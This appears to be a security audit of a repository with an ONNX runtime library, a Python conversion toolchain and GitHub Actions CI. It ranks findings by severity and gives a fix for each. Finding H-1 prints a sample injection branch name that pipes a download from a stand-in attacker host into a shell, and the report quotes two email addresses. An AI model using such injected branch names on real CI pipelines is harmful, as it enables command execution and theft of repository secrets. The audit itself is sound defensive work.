## Critical

### C-1 ‚Äî Double-free of `input` when `build_output` throws
- **Location:** `runtime-library/src/runtime_core.cpp`, `worker_loop()` lines 208‚Äì220
- **Description:** `deep_free_tensors(input)` is called unconditionally at line 208 (after `session->Run` succeeds). If `build_output` then throws ‚Äî possible when `map_from_ort_type` encounters an unsupported ORT type (`runtime_utils.cpp`, `default:` branch) ‚Äî the `catch` block at line 217 calls `deep_free_tensors(input)` again on the already-freed pointer. This is undefined behaviour / heap corruption exploitable via malicious ONNX models with non-standard output element types.
- **Fix:** Set `input = nullptr` immediately after the first `deep_free_tensors(input)` call. The `catch` block calling `deep_free_tensors(nullptr)` is safe (no-op via the `if (!t) return` guard).

### C-2 ‚Äî Memory leak of partially-built `Tensors` on `build_output` exception
- **Location:** `runtime-library/src/runtime_core.cpp`, `build_output()` lines 134‚Äì166
- **Description:** `map_from_ort_type()` (called at line 151) throws `std::runtime_error` for unsupported ORT element types. When this happens mid-loop (e.g. at iteration `i=1` of `n=3` outputs), `out` and `out->tensors` ‚Äî plus any `strdup`/`malloc` allocations for completed iterations ‚Äî are leaked. The exception propagates to `worker_loop`'s `catch`, which never touches `out`.
- **Fix:** Replace the raw loop in `build_output` with a structured approach: initialize all fields to zero/null before entering the loop (`memset(out->tensors, 0, n * sizeof(TensorDescriptor))`), then call `deep_free_tensors(out)` in a `catch` block before re-throwing or returning null.

## High

### H-1 ‚Äî `github.head_ref` expression injection in CI shell steps
- **Location:** `.github/workflows/ci.yml:53,112,164`, `delete-temporary-artifacts.yml:35`
- **Description:** `version=${{ github.head_ref }}` is interpolated directly into `run:` bash/PowerShell steps. A PR branch named `main; curl attacker.com | sh` executes arbitrary commands in the CI runner with access to all repository secrets (`S3_ACCESS_KEY`, `S3_SECRET_KEY`, `S3_ENDPOINT_URL`). Exploitable by anyone able to open a PR.
- **Fix:** Pass the value through an environment variable ‚Äî never expand it directly in shell:
  ```yaml
  env:
    HEAD_REF: ${{ github.head_ref }}
  run: |
    version="$HEAD_REF"
  ```
  Apply to all four affected steps.

### H-2 ‚Äî Python 3.8.16 base image is End-of-Life
- **Location:** `conversion-toolchain/Dockerfile:2`
- **Description:** `FROM python:3.8.16` ‚Äî Python 3.8 reached EOL 2024-10-07. The image has received no CPython, pip, or OS package security patches for 562+ days. All CVEs disclosed after that date are unpatched in the container.
- **Fix:** Upgrade to `FROM python:3.12-slim AS base`. Validate dependency compatibility with Python 3.12 (the toolchain's Python deps all support 3.12).

### H-3 ‚Äî Docker container runs as root
- **Location:** `conversion-toolchain/Dockerfile` (no `USER` directive)
- **Description:** All container processes run as UID 0. Any vulnerability in ONNX model loading or installed packages grants root inside the container.
- **Fix:**
  ```dockerfile
  RUN useradd -m -u 1000 appuser && chown -R appuser:appuser /app
  USER appuser
  ```
  Add before the `ENTRYPOINT` line.

### H-4 ‚Äî GitHub Actions pinned to mutable version tags
- **Location:** `ci.yml:22,35,42,87,99,145,153,199,205,216,236,247,260,266,278,294`, `lint.yml:19,21,30`, `delete-temporary-artifacts.yml` (implicit)
- **Description:** All `uses:` directives use mutable version tags (`actions/checkout@v4`, `actions/upload-artifact@v4`, `actions/setup-python@v5`, `pre-commit/action@v3.0.1`). A supply-chain compromise of any of these actions would silently execute malicious code with access to all CI secrets.
- **Fix:** Pin every `uses:` to a full commit SHA. Example:
  ```yaml
  uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
  ```

### H-5 ‚Äî Python dependencies fully unpinned in Docker image
- **Location:** `conversion-toolchain/requirements.txt`
- **Description:** `lgg`, `onnx`, `onnxsim`, `onnxruntime` are all unpinned. A breaking or malicious release is silently pulled on every Docker build. The project uses `uv.lock` for the test environment but not for the Docker image.
- **Fix:** Pin to exact versions matching the `uv.lock` test environment. Minimum:
  ```
  lgg==0.1.0
  onnx==1.17.0
  onnxsim==0.5.0
  onnxruntime==1.20.1
  ```

### H-6 ‚Äî `protobufjs` RCE vulnerability in vendored ONNX Runtime JS sources (6 Dependabot alerts)
- **Location:** `runtime-library/deps/onnxruntime/onnxruntime-{1.16.3,1.17.3,1.21.1}/js/*/package-lock.json`
- **Description:** All three vendored ORT versions include `protobufjs` at a version with a known arbitrary-code-execution vulnerability (Dependabot severity: critical). These JS files are not used at C++ runtime but are tracked in the repo and trigger scanner alerts.
- **Fix:** Remove the `js/` and test subtrees from all vendored ORT source archives, or add a `.github/dependabot.yml` ignore rule scoped to `runtime-library/deps/**` with an explanatory comment.

## Medium

### M-1 ‚Äî `initialize_logger` calls `exit()` inside a shared library
- **Location:** `runtime-library/src/runtime_utils.cpp:198`
- **Description:** `exit(EXIT_FAILURE)` is called when logger initialisation fails (e.g. unwritable log path). In a shared library, `exit()` terminates the entire host process without giving the caller a chance to handle the error or clean up resources.
- **Fix:** Throw a `std::runtime_error` instead. The `runtime_init()` outer `try/catch` already captures this and returns `RUNTIME_STATUS_ERROR`.

### M-2 ‚Äî `s5cmd` downloaded without integrity verification (Windows CI)
- **Location:** `.github/workflows/ci.yml:124‚Äì130`
- **Description:** `s5cmd` is fetched via `Invoke-WebRequest` with no checksum verification. A MITM or compromised GitHub release could substitute a binary that exfiltrates S3 credentials.
- **Fix:**
  ```powershell
  $expected = "<known-sha256>"
  $actual = (Get-FileHash $s5cmdZip -Algorithm SHA256).Hash
  if ($actual -ne $expected) { throw "Checksum mismatch: expected $expected, got $actual" }
  ```

### M-3 ‚Äî Null pointer dereference when `build_output` returns `nullptr`
- **Location:** `runtime-library/src/runtime_core.cpp:210‚Äì216`
- **Description:** If `build_output` returns `nullptr` (both `out->tensors` malloc branches return null), the `if (output)` guard prevents a crash ‚Äî but the inference result is silently dropped with no error logged and no `sem_post`. Any caller blocked in `runtime_retrieve_output` with `timeout_ms < 0` will block indefinitely.
- **Fix:** Log an error and/or return a sentinel error result to unblock waiting callers when `build_output` returns null.

### M-4 ‚Äî S3 credentials written to disk as plaintext (`~/.s3cfg`)
- **Location:** `.github/workflows/ci.yml:60‚Äì70`, `.github/workflows/ci.yml:171‚Äì181`
- **Description:** The "Configure s3cmd" step writes `S3_ACCESS_KEY` and `S3_SECRET_KEY` into `~/.s3cfg` as plaintext. While GHA runners are ephemeral, this persists on disk for the duration of the job and is accessible to all subsequent steps, including any third-party action that might be injected via H-1.
- **Fix:** Pass credentials via environment variables directly to `s3cmd` using the `--access_key` / `--secret_key` flags or `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` env vars (s3cmd supports both), avoiding the credential file entirely.

### M-5 ‚Äî No path validation on `--onnx-path` (path traversal)
- **Location:** `conversion-toolchain/conversion_toolchain/main.py:9‚Äì24`
- **Description:** `onnx_path` is passed directly from CLI args to `onnx.load()` and `open()` without canonicalization. A path containing `../` could traverse outside intended directories if the container is run with broad mounts.
- **Fix:** Apply `os.path.realpath()` normalization and validate the `.onnx` extension before processing. Consider an optional `--allowed-root` containment check.

### M-6 ‚Äî `md5_hash` reads entire file into memory (OOM risk)
- **Location:** `conversion-toolchain/conversion_toolchain/utils.py:28‚Äì30`
- **Description:** `hashlib.md5(f.read())` loads the full ONNX model into memory. Multi-GB models can exhaust container memory.
- **Fix:**
  ```python
  def md5_hash(file_path: str) -> str:
      h = hashlib.md5()
      with open(file_path, "rb") as f:
          for chunk in iter(lambda: f.read(65536), b""):
              h.update(chunk)
      return h.hexdigest()
  ```

### M-7 ‚Äî Shape dimensions silently truncated from `int64_t` to `int` (32-bit)
- **Location:** `runtime-library/src/runtime_core.cpp:157`
- **Description:** `out->tensors[i].shape[j] = (int)shape[j]` ‚Äî ORT returns `int64_t` dimensions; the public `TensorDescriptor.shape` field is `int*`. Dimensions exceeding `INT_MAX` (~2.1 billion) are silently truncated. When the caller reads `shape` back and passes it to ORT, the shape is corrupted, leading to undefined behaviour or a wrong-size tensor copy.
- **Fix:** Change `TensorDescriptor.shape` from `int*` to `int64_t*` in `oaax_runtime.h`. This is a breaking API change and should be done before the v2 API is stabilised.

## Low

### L-1 ‚Äî Personal data: corporate email in tracked source
- **Location:** `conversion-toolchain/setup.py:7`
- **Description:** `author_email="aassis@networkoptix.com"` is hardcoded in a publicly tracked file.
- **Fix:** Replace with a role-based address (e.g. `opensource@networkoptix.com`) or remove the field; the package is not published to PyPI.

### L-2 ‚Äî Personal data: personal email in tracked agent documentation
- **Location:** `.claude/CLAUDE.md:122`, `.claude/agents/security-analyzer.md:130`
- **Description:** `assis.ayoub@gmail.com` appears in commit template examples inside the tracked `.claude/` directory, visible to anyone with repo access.
- **Fix:** Replace with the corporate email, or move the commit template to `.claude/settings.local.json` (which is gitignored).

### L-3 ‚Äî `id-token` permission not explicitly denied
- **Location:** `ci.yml` and `delete-temporary-artifacts.yml`, `permissions:` blocks
- **Description:** Both files set `contents: none` but do not explicitly list `id-token: none`. The implicit value is `none` but it is not stated, creating a minor defence-in-depth gap.
- **Fix:** Add `id-token: none` to each workflow's top-level `permissions` block.

### L-4 ‚Äî Pre-commit hook revisions use mutable tags
- **Location:** `.pre-commit-config.yaml`
- **Description:** All five pre-commit hooks use mutable version tags (`v5.0.0`, `v0.8.0`, etc.). A supply-chain compromise could inject malicious linting/formatting into developer workflows.
- **Fix:** Pin each `rev:` to a full commit SHA. Pre-commit's `autoupdate --freeze` command automates this.

## Recommended Fix Order

1. **C-1** ‚Äî Set `input = nullptr` after first `deep_free_tensors(input)` (one-line fix, prevents heap corruption)
2. **C-2** ‚Äî Add `memset` + exception-safe cleanup to `build_output` (prevents memory leak on error path)
3. **H-1** ‚Äî Fix `github.head_ref` injection in all 4 affected CI steps (remotely exploitable now)
4. **M-7** ‚Äî Change `TensorDescriptor.shape` to `int64_t*` while the v2 API is still in development
5. **H-2 + H-3** ‚Äî Upgrade Docker base image to Python 3.12-slim + add non-root user
6. **H-4 + H-5** ‚Äî Pin GitHub Actions to commit SHAs + pin Python deps in `requirements.txt`
7. **M-1** ‚Äî Replace `exit()` with `throw` in `initialize_logger`
8. **M-4** ‚Äî Remove `~/.s3cfg` credential file; use env var flags instead
9. **M-2** ‚Äî Add SHA256 checksum verification for `s5cmd` download
10. **L-1 + L-2** ‚Äî Personal data cleanup
